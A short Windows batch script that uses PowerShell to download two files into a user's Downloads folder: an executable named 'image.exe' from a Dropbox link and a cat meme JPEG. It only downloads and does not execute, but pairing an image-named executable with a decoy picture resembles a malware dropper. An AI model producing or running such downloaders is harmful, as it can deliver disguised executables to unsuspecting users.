@echo off
set files="https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0" "https://www.cats.org.uk/media/6099/laptop-cat-meme-400px.jpg?width=400&height=306"

for %%i in (%files%) do (
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%%i', 'C:\Users\user1\Downloads\' + [System.IO.Path]::GetFileName('%%i'))"
)

echo Download completed!
pause
